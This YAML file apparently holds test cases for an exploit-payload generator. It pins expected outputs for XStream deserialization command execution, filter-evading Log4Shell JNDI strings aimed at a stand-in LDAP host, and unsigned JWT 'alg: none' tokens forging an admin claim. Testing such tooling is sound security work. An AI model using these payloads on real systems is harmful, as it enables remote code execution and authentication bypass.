  # ================= deser.java.xstream.dynamicproxy · sh =================

  - name: deser.java.xstream.dynamicproxy · sh=sh
    state:
      vuln: deser
      component: xstream
      template: deser.java.xstream.dynamicproxy
      slots: {sh: sh}
      vars: {cmd: id}
      outputs: [raw]
    expect:
      payload: |-
        <sorted-set>
          <string>foo</string>
          <dynamic-proxy>
            <interface>java.lang.Comparable</interface>
            <handler class="java.beans.EventHandler">
              <target class="java.lang.ProcessBuilder">
                <command>
                  <string>/bin/sh</string>
                  <string>-c</string>
                  <string>id</string>
                </command>
              </target>
              <action>start</action>
            </handler>
          </dynamic-proxy>
        </sorted-set>
      syntax: ok

  - name: deser.java.xstream.dynamicproxy · sh=cmd
    state:
      vuln: deser
      component: xstream
      template: deser.java.xstream.dynamicproxy
      slots: {sh: cmd}
      vars: {cmd: whoami}
      outputs: [raw]
    expect:
      payload: |-
        <sorted-set>
          <string>foo</string>
          <dynamic-proxy>
            <interface>java.lang.Comparable</interface>
            <handler class="java.beans.EventHandler">
              <target class="java.lang.ProcessBuilder">
                <command>
                  <string>cmd.exe</string>
                  <string>/c</string>
                  <string>whoami</string>
                </command>
              </target>
              <action>start</action>
            </handler>
          </dynamic-proxy>
        </sorted-set>
      syntax: ok

  # ================= deser.java.log4j.obfuscate · style =================
  # 三个选项是三种「把 jndi:ldap 拆散」的手法，产出的前缀完全不同。
  # `name` 是模板声明的变量、不是槽位，漏填会留下字面量 `<<name>>`。

  - name: deser.java.log4j.obfuscate · style=lower
    state:
      vuln: deser
      component: log4j
      template: deser.java.log4j.obfuscate
      slots: {style: lower}
      vars: {lhost: 10.0.0.1, lport: "1389", name: Exploit}
      outputs: [raw]
    expect:
      payload: "${lower:j}ndi:${lower:l}dap://10.0.0.1:1389/Exploit"

  - name: deser.java.log4j.obfuscate · style=upper
    state:
      vuln: deser
      component: log4j
      template: deser.java.log4j.obfuscate
      slots: {style: upper}
      vars: {lhost: 10.0.0.1, lport: "1389", name: Exploit}
      outputs: [raw]
    expect:
      payload: "${upper:J}NDI:${upper:L}DAP://10.0.0.1:1389/Exploit"

  - name: deser.java.log4j.obfuscate · style=dash
    state:
      vuln: deser
      component: log4j
      template: deser.java.log4j.obfuscate
      slots: {style: dash}
      vars: {lhost: 10.0.0.1, lport: "1389", name: Exploit}
      outputs: [raw]
    expect:
      # `${::-j}` 是「取默认值空串」的写法，等价于字面 j；整串里没有 jndi/ldap 明文
      payload: "${${::-j}${::-n}${::-d}${::-i}:${${::-l}${::-d}${::-a}${::-p}}://10.0.0.1:1389/Exploit"

  # ================= deser.php.syntax.boolean · v =================
  # 序列化里的布尔/空值只有三种形态，字段名就叫 seq。

  - name: deser.php.syntax.boolean · v=true_
    state:
      vuln: deser
      component: php
      template: deser.php.syntax.boolean
      slots: {v: true_}
      outputs: [raw]
    expect:
      payload: "b:1;"

  - name: deser.php.syntax.boolean · v=false_
    state:
      vuln: deser
      component: php
      template: deser.php.syntax.boolean
      slots: {v: false_}
      outputs: [raw]
    expect:
      payload: "b:0;"

  - name: deser.php.syntax.boolean · v=null_
    state:
      vuln: deser
      component: php
      template: deser.php.syntax.boolean
      slots: {v: null_}
      outputs: [raw]
    expect:
      # 空值不是 `b:0;` 也不是 `s:0:"";`，是单独的 `N;`——这里打错是最典型的静默损坏
      payload: "N;"

  # ================= jwt.generic.none.header · alg =================
  # 头部 JSON 里 alg 的大小写四档，用来打「正则只匹配小写 none」的库。
  # 期望值里的 JSON 逐字符写出来，字段顺序保持 body 里的 alg → typ。

  - name: jwt.generic.none.header · alg=none
    state:
      vuln: jwt
      template: jwt.generic.none.header
      slots: {alg: none}
      outputs: [raw]
    expect:
      payload: '{"alg":"none","typ":"JWT"}'
      syntax: ok

  - name: jwt.generic.none.header · alg=none-cap
    state:
      vuln: jwt
      template: jwt.generic.none.header
      slots: {alg: none-cap}
      outputs: [raw]
    expect:
      payload: '{"alg":"None","typ":"JWT"}'
      syntax: ok

  - name: jwt.generic.none.header · alg=none-upper
    state:
      vuln: jwt
      template: jwt.generic.none.header
      slots: {alg: none-upper}
      outputs: [raw]
    expect:
      payload: '{"alg":"NONE","typ":"JWT"}'
      syntax: ok

  - name: jwt.generic.none.header · alg=none-mixed
    state:
      vuln: jwt
      template: jwt.generic.none.header
      slots: {alg: none-mixed}
      outputs: [raw]
    expect:
      payload: '{"alg":"nOnE","typ":"JWT"}'
      syntax: ok

  # ================= jwt.generic.none.token · alg =================
  # 头段是**槽位里预先算好的 base64url**，不是运行时编码的——所以这里要钉住
  # 「哪个选项对应哪一段 base64」。四段都独立 base64 解码核对过：
  #   none      → {"alg":"none","typ":"JWT"}
  #   none-cap  → {"alg":"None","typ":"JWT"}
  #   none-upper→ {"alg":"NONE","typ":"JWT"}
  #   none-mixed→ {"alg":"nOnE","typ":"JWT"}
  # claims 段是 {"sub":"admin"} 的 base64url（无填充）。

  - name: jwt.generic.none.token · alg=none
    state:
      vuln: jwt
      template: jwt.generic.none.token
      slots: {alg: none}
      vars: {claims: eyJzdWIiOiJhZG1pbiJ9}
      outputs: [raw]
    expect:
      # 签名段留空但点号保留 —— 两段 + 尾点
      payload: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9.

  - name: jwt.generic.none.token · alg=none-cap
    state:
      vuln: jwt
      template: jwt.generic.none.token
      slots: {alg: none-cap}
      vars: {claims: eyJzdWIiOiJhZG1pbiJ9}
      outputs: [raw]
    expect:
      payload: eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9.

  - name: jwt.generic.none.token · alg=none-upper
    state:
      vuln: jwt
      template: jwt.generic.none.token
      slots: {alg: none-upper}
      vars: {claims: eyJzdWIiOiJhZG1pbiJ9}
      outputs: [raw]
    expect:
      payload: eyJhbGciOiJOT05FIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9.

  - name: jwt.generic.none.token · alg=none-mixed
    state:
      vuln: jwt
      template: jwt.generic.none.token
      slots: {alg: none-mixed}
      vars: {claims: eyJzdWIiOiJhZG1pbiJ9}
      outputs: [raw]
    expect:
      payload: eyJhbGciOiJuT25FIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9.

